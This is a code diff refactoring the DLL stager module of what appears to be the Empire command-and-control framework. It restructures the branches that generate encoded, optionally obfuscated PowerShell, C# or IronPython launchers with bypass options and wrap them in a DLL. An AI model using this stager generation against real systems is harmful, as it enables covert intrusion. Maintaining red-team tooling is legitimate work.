@@ -106,56 +106,55 @@ class Stager:
             # not a valid listener, return nothing for the script
             log.error(f"[!] Invalid listener: {listener_name}")
             return ""
-        else:
-            obfuscate_script = False
-            if obfuscate.lower() == "true":
-                obfuscate_script = True
 
-            if obfuscate_script and "launcher" in obfuscate_command.lower():
+        obfuscate_script = False
+        if obfuscate.lower() == "true":
+            obfuscate_script = True
+
+        if obfuscate_script and "launcher" in obfuscate_command.lower():
+            log.error(
+                "If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."
+            )
+            return ""
+
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
                 log.error(
-                    "If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                 )
                 return ""
 
-            if language in ["csharp", "ironpython"]:
-                if (
-                    self.mainMenu.listenersv2.get_active_listener_by_name(
-                        listener_name
-                    ).info["Name"]
-                    != "HTTP[S]"
-                ):
-                    log.error(
-                        "Only HTTP[S] listeners are supported for C# and IronPython stagers."
-                    )
-                    return ""
+            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
 
-                launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
-                    language=language,
-                    obfuscate=obfuscate_script,
-                    obfuscation_command=obfuscate_command,
-                    encode=True,
-                    listener_name=listener_name,
-                )
+        elif language == "powershell":
+            # generate the PowerShell one-liner with all of the proper options set
+            launcher = self.mainMenu.stagergenv2.generate_launcher(
+                listener_name=listener_name,
+                language=language,
+                encode=True,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                user_agent=user_agent,
+                proxy=proxy,
+                proxy_creds=proxy_creds,
+                stager_retries=stager_retries,
+                bypasses=bypasses,
+            )
 
-            elif language == "powershell":
-                # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagergenv2.generate_launcher(
-                    listener_name=listener_name,
-                    language=language,
-                    encode=True,
-                    obfuscate=obfuscate_script,
-                    obfuscation_command=obfuscate_command,
-                    user_agent=user_agent,
-                    proxy=proxy,
-                    proxy_creds=proxy_creds,
-                    stager_retries=stager_retries,
-                    bypasses=bypasses,
-                )
+        if launcher == "":
+            log.error("[!] Error in launcher generation.")
+            return ""
 
-            if launcher == "":
-                log.error("[!] Error in launcher generation.")
-                return ""
-            else:
-                launcher_code = launcher.split(" ")[-1]
-                dll = self.mainMenu.stagergenv2.generate_dll(launcher_code, arch)
-                return dll
+        launcher_code = launcher.split(" ")[-1]
+        return self.mainMenu.stagergenv2.generate_dll(launcher_code, arch)
